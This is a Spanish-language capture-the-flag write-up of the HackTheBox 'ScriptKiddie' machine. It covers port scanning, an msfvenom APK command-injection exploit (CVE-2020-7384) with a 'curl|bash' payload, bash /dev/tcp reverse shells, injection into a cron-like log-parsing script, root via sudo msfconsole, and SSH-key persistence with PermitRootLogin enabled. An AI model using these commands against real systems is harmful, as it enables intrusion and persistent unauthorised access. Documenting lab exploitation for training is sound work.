---
title: HackTheBox - ScriptKiddie
author: cotes
date: 2023-09-14 17:51:00 +0800
categories: [Writeup, HackTheBox, Easy]
tags: [Linux, 'msfvenom Command Injection (CVE-2020-7384)', 'Command Injection', Binary Abusing]
math: true
mermaid: true
image:
  path: /assets/images/HTB/Easy/ScriptKiddie/logo.png
  lqip: data:image/webp;base64,UklGRpoAAABXRUJQVlA4WAoAAAAQAAAADwAABwAAQUxQSDIAAAARL0AmbZurmr57yyIiqE8oiG0bejIYEQTgqiDA9vqnsUSI6H+oAERp2HZ65qP/VIAWAFZQOCBCAAAA8AEAnQEqEAAIAAVAfCWkAALp8sF8rgRgAP7o9FDvMCkMde9PK7euH5M1m6VWoDXf2FkP3BqV0ZYbO6NA/VFIAAAA
  alt: ScriptKiddie Machine Logo
---

Máquina Linux de nivel **Easy** de HackThBox.

Técnicas usadas: **msfvenom Command Injection (CVE-2020-7384), Command Injection, Binary Abusing**

### Fase de Reconocimiento 🧣

a. Enumeramos los puertos que están abiertos.

* **`nmap -p- -sS -Pn -n <IP> -oG puertos`**

    ![](/assets/images/HTB/Easy/ScriptKiddie/01-ports.png)

b. Vemos las versiones de los servicios que se están ejecutando en los puertos abiertos

* **`nmap -p<Puertos> -sCV <IP> -oN versiones`**

    ![](/assets/images/HTB/Easy/ScriptKiddie/02-versions.png)

c. Visitamos el sitio web

![](/assets/images/HTB/Easy/ScriptKiddie/03-web.png)

> La máquina fue liberada el **2021**, por lo que buscaremos algún exploit de nmap o msfvenom en ese año.
{: .prompt-info }

d. Encontramos el [CVE-2020-7384](https://www.exploit-db.com/exploits/49491), modificamos el script para inyectar el comando `curl <tun0 IP>|bash`

```bash
# Change me
payload = 'curl <tun0IP>|bash'
-------------------------------
❯ python msfvenom_rce.py

[+] Done! apkfile is at /tmp/tmpaez5ybvj/evil.apk
```
* Antes de subir el apk a la página web, creamos un fichero 'index.html', lo servimos con python y nos ponemos en escucha con nc

    ```bash
    ❯ cat index.html
    #!/bin/bash

    bash -i >& /dev/tcp/10.10.14.18/443 0>&1
    -----------------------------------------
    ❯ python -m http.server 80
    ❯ nc -lvnp 443
    ```

* Ahora, subimos el **evil.apk** y recibiremos un reverse shell

    ![](/assets/images/HTB/Easy/ScriptKiddie/04-command.png)


    ```bash
    ❯ nc -lvnp 443
    kid@scriptkiddie:~/html$
    ```

### Escalada de Privilegios 💹

a. Para maniobrar de manera más cómoda, nos autenticamos por el servicio SSH

* Primero, creamos un par de claves **id_rsa** en nuestra máquina

    ```bash
    ❯ ssh-keygen
    ```

* Copiamos la clave id_rsa pública y lo colocamos en el fichero 'authorized_keys' en el directorio .ssh del usuario kid

    ```bash
    kid@scriptkiddie:~/.ssh$ echo -n '<id_rsa pública>' > authorized_keys
    ```

* Ya nos podemos conectar por el servicio ssh

    ```bash
    ❯ ssh kid@<IP ScriptKiddie> -i id_rsa
    kid@scriptkiddie:~$
    ```

b. Al investigar en el sistema, vemos que existe otro usuario y del cual podemos leer script 'scanlosers.sh'

```bash
kid@scriptkiddie:/home$ ls
kid  pwn
kid@scriptkiddie:/home$ ls pwn
recon  scanlosers.sh
kid@scriptkiddie:/home/pwn$ cat scanlosers.sh 
#!/bin/bash

log=/home/kid/logs/hackers

cd /home/pwn/
cat $log | cut -d' ' -f3- | sort -u | while read ip; do
    sh -c "nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2>&1 >/dev/null" &
done

if [[ $(wc -l < $log) -gt 0 ]]; then echo -n > $log; fi
```

> Podemos inyectar comandos ya que la variable `ip` se obtiene de forma insegura. Además esta tarea no se ejecuta cada cierto tiempo, lo que nos lleva a pensar, que se ejecuta cada que modificamos el fichero '/home/kid/logs/hackers'
{: .prompt-info }

* `cut -d' ' -f3-`: Lo que hace es leer del tercer argumento en adelante

c. Nos enviamos una reverse shell

```bash
kid@scriptkiddie:/home/pwn$ echo '1 2 ;bash -c "bash -i >& /dev/tcp/<tun0 IP>/443 0>&1";' > /home/kid/logs/hackers
---------------------------------------------------------------------------------------------------------------------
❯ nc -lvnp 443
pwn@scriptkiddie:~$ script /dev/null -c bash
[Ctrl + Z]
❯ stty raw -echo;fg

    reset xterm

pwn@scriptkiddie:~$ export TERM=xterm-256color
pwn@scriptkiddie:~$ source /etc/skel/.bashrc
```

d. Listamos nuestros permisos a nivel de sudoers

```bash
pwn@scriptkiddie:~$ sudo -l
    (root) NOPASSWD: /opt/metasploit-framework-6.0.9/msfconsole
```

* Nos lanzamos un bash como root, seguimos los pasos que nos indican en [Gtfobins](https://gtfobins.github.io/gtfobins/msfconsole/#shell)

    ```bash
    pwn@scriptkiddie:~$ sudo /opt/metasploit-framework-6.0.9/msfconsole
    msf6 > irb
    [*] Starting IRB shell...
    [*] You are in the "framework" object

    irb: warn: can't alias jobs from irb_jobs.
    >> system("bash")
    root@scriptkiddie:/home/pwn# 
    ```

e. Por último, para entablar 'persistencia' lo que haremos es permitir al usuario root autenticarse por ssh

* Habilitamos al usuario root

    ```bash
    root@scriptkiddie:~/.ssh# cat /etc/ssh/sshd_config

    # Cambiamos esta línea
    #PermitRootLogin prohibit-password 
    # Por esto
    PermitRootLogin yes
    ```

* Copiamos nuestra clave id_rsa pública en el fichero 'authorized_keys' del usuario root

    ```bash
    root@scriptkiddie:~# mkdir .ssh
    root@scriptkiddie:~# cd .ssh/
    root@scriptkiddie:~/.ssh# echo -n '<id_rsa pública>' > authorized_keys
    ```

* Ahora ya podemos acceder al usuario root directamente desde el servicio SSH

    ```bash
    ❯ ssh root@<IP ScriptKiddie> -i id_rsa
    root@scriptkiddie:~# 
    ```